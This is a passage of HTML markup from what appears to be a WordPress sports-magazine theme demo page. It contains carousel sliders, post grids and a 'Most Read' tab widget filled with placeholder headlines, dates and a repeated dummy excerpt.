                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/talent-crisis-gives-aaron-finch-his-test-match-chance/">
                                                        Talent crisis gives Aaron Finch his Test-match                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured4.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/how-did-it-go-so-wrong-for-ferrari-in-singapore-2/">
                                                        How did it go so wrong for Ferrari in Singapore?                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item active" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured3.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/bernard-the-only-positive-everton-crumble-all-over-the-pitch/">
                                                        Bernard the only positive, Everton crumble all over                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured2.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/greenough-prison-break-reveal-caused/">
                                                        Greenough Prison break reveal caused                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item cloned" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured1.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/talent-crisis-gives-aaron-finch-his-test-match-chance/">
                                                        Talent crisis gives Aaron Finch his Test-match                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item cloned" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured4.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/how-did-it-go-so-wrong-for-ferrari-in-singapore-2/">
                                                        How did it go so wrong for Ferrari in Singapore?                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div></div></div><div class="container slider-arrow-item"><div class="row"><div class="col-lg-9"><div class="owl-nav"><button role="presentation" class="owl-prev"><i class="icon-arrow-left"></i></button><button role="presentation" class="owl-next"><i class="icon-arrow-right"></i></button></div></div></div></div><div class="container slider-dot-item"><div class="row"><div class="col-lg-9"><div class="owl-dots"><button class="owl-dot"><span></span></button><button class="owl-dot"><span></span></button><button class="owl-dot active"><span></span></button><button class="owl-dot"><span></span></button></div></div></div></div></div>

              		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="b64dbfb" class="elementor-element elementor-element-b64dbfb elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="778a9f4" class="elementor-element elementor-element-778a9f4 elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="a47c56c" class="elementor-element elementor-element-a47c56c elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm grid-no-desc">
                                            <div class="ts-overlay-style featured-post post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
               plans to ride out Hurricane the Florence on a boat               </a>
            </h3>
            <ul class="post-meta-info">
                              
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                       <div class="grid-item grid-sm grid-no-desc">
                                            <div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
               Marriott has new rewards offerings and you don’t need               </a>
            </h3>
            <ul class="post-meta-info">
                              
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="fb398a5" class="elementor-element elementor-element-fb398a5 elementor-column elementor-col-50 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="c165ff3" class="elementor-element elementor-element-c165ff3 elementor-widget elementor-widget-vinazine-featured-post" data-element_type="vinazine-featured-post.default">
				<div class="elementor-widget-container">
			            
                <div data-autoplay="no" id="featured-slider" class="owl-carousel grid-slider vinazine-featured-post slider-grid-style1 owl-loaded owl-drag">
                                            
                                            
                                            
                                    <div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0s ease 0s; width: 1680px;"><div class="owl-item active" style="width: 560px;"><div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-850x560.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
               Marriott has new rewards offerings and you don’t need               </a>
            </h3>
            <ul class="post-meta-info">
                              <li class="author">
                  <a href="http://vinkmag.xpeedstudio.com/sports/author/vinkmag/">
                                             <img src="{THEMES_PAGE}/assets/images/user2.png" width="80" height="80" alt="" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 photo avatar-default">                                          John Doe                  </a>
               </li>
                                             <li>
                  <i class="fa fa-clock-o"></i>March 1, 2018               </li>
               
                              <li class="active">
                  <i class="icon-fire"></i>
                  90               </li>
                           </ul>
         </div>
      </div>
   </div>
</div></div><div class="owl-item" style="width: 560px;"><div class="ts-overlay-style featured-post post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-850x560.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
               plans to ride out Hurricane the Florence on a boat               </a>
            </h3>
            <ul class="post-meta-info">
                              <li class="author">
                  <a href="http://vinkmag.xpeedstudio.com/sports/author/vinkmag/">
                                             <img src="{THEMES_PAGE}/assets/images/user2.png" width="80" height="80" alt="" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 photo avatar-default">                                          John Doe                  </a>
               </li>
                                             <li>
                  <i class="fa fa-clock-o"></i>January 7, 2018               </li>
               
                              <li class="active">
                  <i class="icon-fire"></i>
                  64               </li>
                           </ul>
         </div>
      </div>
   </div>
</div></div><div class="owl-item" style="width: 560px;"><div class="ts-overlay-style featured-post post-184 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports4-850x560.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">
               Vontae Davis Quit on the Bills at Halftime, Changed into               </a>
            </h3>
            <ul class="post-meta-info">
                              <li class="author">
                  <a href="http://vinkmag.xpeedstudio.com/sports/author/vinkmag/">
                                             <img src="{THEMES_PAGE}/assets/images/user2.png" width="80" height="80" alt="" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 photo avatar-default">                                          John Doe                  </a>
               </li>
                                             <li>
                  <i class="fa fa-clock-o"></i>January 5, 2019               </li>
               
                              <li class="active">
                  <i class="icon-fire"></i>
                  64               </li>
                           </ul>
         </div>
      </div>
   </div>
</div></div></div></div><div class="owl-nav"><button role="presentation" class="owl-prev disabled"><i class="fa fa-angle-left"></i></button><button role="presentation" class="owl-next"><i class="fa fa-angle-right"></i></button></div><div class="owl-dots disabled"></div></div>

                              		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="99f22d4" class="elementor-element elementor-element-99f22d4 elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="d377f71" class="elementor-element elementor-element-d377f71 elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-186 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports category-surfing tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports2-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">
               Youth vaping an epidemic with crackdown coming               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>December 7, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                       <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-158 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports5-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/"></a>
      <div class="ts-post-thumb">
          
                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
               Cricket            </a>
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
               The clock is ticking for e-cig companies underage users               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>December 7, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="127c2e4" class="elementor-element elementor-element-127c2e4 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="95a744d" class="elementor-element elementor-element-95a744d elementor-column elementor-col-66 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="2717f7c" class="elementor-element elementor-element-2717f7c elementor-widget elementor-widget-vinazine-post-tab-2" data-element_type="vinazine-post-tab-2.default">
				<div class="elementor-widget-container">
			        
        <div class="ts-grid-box tabs-item mb-30 bg-dark-item white-text ">
            <div class="clearfix ts-tab-style">
                
      <h2 class="ts-title block-title-style1 float-left">
      <span class="title-before"></span>
      Most  Read      </h2>
                  
            
                
                <ul class="tab-menu-item nav float-right" role="tablist" id="vinkmagposttab22717f7cTab">
                                            <li class="nav-item">
                            <a class="nav-link active" href="http://vinkmag.xpeedstudio.com/sports/#tab-2717f7c1" role="tab" data-toggle="tab">Cricket</a>
                        </li>
                                            <li class="nav-item">
                            <a class="nav-link " href="http://vinkmag.xpeedstudio.com/sports/#tab-2717f7c2" role="tab" data-toggle="tab">Football</a>
                        </li>
                                            <li class="nav-item">
                            <a class="nav-link " href="http://vinkmag.xpeedstudio.com/sports/#tab-2717f7c3" role="tab" data-toggle="tab">Tennis</a>
                        </li>
                                            <li class="nav-item">
                            <a class="nav-link " href="http://vinkmag.xpeedstudio.com/sports/#tab-2717f7c4" role="tab" data-toggle="tab">Baseball</a>
                        </li>
                                    </ul>
            </div>
            <div class="tab-content ts-tabs-content" id="vinkmagposttab22717f7cTabContent">

                	
		<div role="tabpanel" class="tab-pane fade show active" id="tab-2717f7c1">
	<div class="row">
		<div class="col-lg-7">
			<div class="tab-content featured-post">
									<div class="tab-pane ts-overlay-style fade show active" id="nav-post-tab-2717f7c-11" role="tabpanel" aria-labelledby="nav-2717f7c-11-tab">
						<div class="ts-overlay-style featured-post post-172 post type-post status-publish format-video has-post-thumbnail hentry category-video post_format-post-format-video">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2017/01/08/theye-back-kennedy-darlings-return/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2017/01/08/theye-back-kennedy-darlings-return/">
            Theye back return to you Kennedy Darlings            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>January 8, 2017            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  93               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-21" role="tabpanel" aria-labelledby="nav-2717f7c-21-tab">
						<div class="ts-overlay-style featured-post post-4374 post type-post status-publish format-video has-post-thumbnail hentry category-video post_format-post-format-video">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health9-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/11/plans-to-ride-out-hurricane-the-florence-on-a-boat-2/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/11/plans-to-ride-out-hurricane-the-florence-on-a-boat-2/">
            Plans to ride out Hurricane the Florence on a boat            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>January 11, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  7               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-31" role="tabpanel" aria-labelledby="nav-2717f7c-31-tab">
						<div class="ts-overlay-style featured-post post-3722 post type-post status-publish format-video hentry category-video post_format-post-format-video">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/themes/vinazine/assets/images/default_thumb.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/14/theyre-back-kennedy-darlingnamed-to-return-to/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/14/theyre-back-kennedy-darlingnamed-to-return-to/">
            They’re back! Kennedy Darling,named to return to            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>January 14, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  67               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
							</div>
		</div>
		<div class="col-lg-5">
			<div class="nav post-list-box" role="tablist">
									<a class="nav-item nav-link active" id="nav-2717f7c-11-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-11" role="tab" aria-controls="nav-post-tab-2717f7c-11" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/health7-455x300.jpg" alt="Theye back return to you Kennedy Darlings">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Theye back return to you Kennedy Darlings								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									January 8, 2017								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-21-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-21" role="tab" aria-controls="nav-post-tab-2717f7c-21" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/health9-455x300.jpg" alt="Plans to ride out Hurricane the Florence on a boat">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Plans to ride out Hurricane the Florence on a boat								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									January 11, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-31-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-31" role="tab" aria-controls="nav-post-tab-2717f7c-31" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/default_thumb.jpg" alt="They’re back! Kennedy Darling,named to return to">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									They’re back! Kennedy Darling,named to return to								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									January 14, 2018								</span>
							</div>
						</div>
					</a>
							</div>
		</div>
	</div>
	</div>
	
		<div role="tabpanel" class="tab-pane fade " id="tab-2717f7c2">
	<div class="row">
		<div class="col-lg-7">
			<div class="tab-content featured-post">
									<div class="tab-pane ts-overlay-style fade show active" id="nav-post-tab-2717f7c-12" role="tabpanel" aria-labelledby="nav-2717f7c-12-tab">
						<div class="ts-overlay-style featured-post post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
            plans to ride out Hurricane the Florence on a boat            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>January 7, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  64               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-22" role="tabpanel" aria-labelledby="nav-2717f7c-22-tab">
						<div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
            Marriott has new rewards offerings and you don’t need            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>March 1, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  90               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
									<div class="tab-pane ts-overlay-style fade " id="nav-post-tab-2717f7c-32" role="tabpanel" aria-labelledby="nav-2717f7c-32-tab">
						<div class="ts-overlay-style featured-post post-3718 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
<div class="item" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports3-600x398.jpg)">
   <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/"></a>
   <div class="overlay-post-content">
      <div class="post-content">
      
         <h3 class="post-title">
            <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">
            Clock is companies underage ticking for e-cig  users            </a>
         </h3>
         <ul class="post-meta-info">
                                    <li>
               <i class="fa fa-clock-o"></i>April 8, 2018            </li>
            
                           <li class="active">
                  <i class="icon-fire"></i>
                  16               </li>
            
         </ul>
      </div>
   </div>
</div>
</div>					</div>
							</div>
		</div>
		<div class="col-lg-5">
			<div class="nav post-list-box" role="tablist">
									<a class="nav-item nav-link active" id="nav-2717f7c-12-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-12" role="tab" aria-controls="nav-post-tab-2717f7c-12" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports1-455x300.jpg" alt="plans to ride out Hurricane the Florence on a boat">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									plans to ride out Hurricane the Florence on a boat								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									January 7, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-22-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-22" role="tab" aria-controls="nav-post-tab-2717f7c-22" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/health7-455x300.jpg" alt="Marriott has new rewards offerings and you don’t need">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Marriott has new rewards offerings and you don’t need								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									March 1, 2018								</span>
							</div>
						</div>
					</a>
									<a class="nav-item nav-link " id="nav-2717f7c-32-tab" data-toggle="tab" href="http://vinkmag.xpeedstudio.com/sports/#nav-post-tab-2717f7c-32" role="tab" aria-controls="nav-post-tab-2717f7c-32" aria-selected="true">
						<div class="post-content media">
						<img class="d-flex" src="{THEMES_PAGE}/assets/images/sports3-455x300.jpg" alt="Clock is companies underage ticking for e-cig  users">
							<div class="media-body align-self-center">
								<h4 class="post-title">
								
									Clock is companies underage ticking for e-cig users								</h4>
								<span class="post-date-info">
									<i class="fa fa-clock-o"></i>
									April 8, 2018								</span>
							</div>
						</div>
					</a>
							</div>
		</div>
	</div>
	</div>
	
		<div role="tabpanel" class="tab-pane fade " id="tab-2717f7c3">
	<div class="row">
		<div class="col-lg-7">
			<div class="tab-content featured-post">
									<div class="tab-pane ts-overlay-style fade show active" id="nav-post-tab-2717f7c-13" role="tabpanel" aria-labelledby="nav-2717f7c-13-tab">
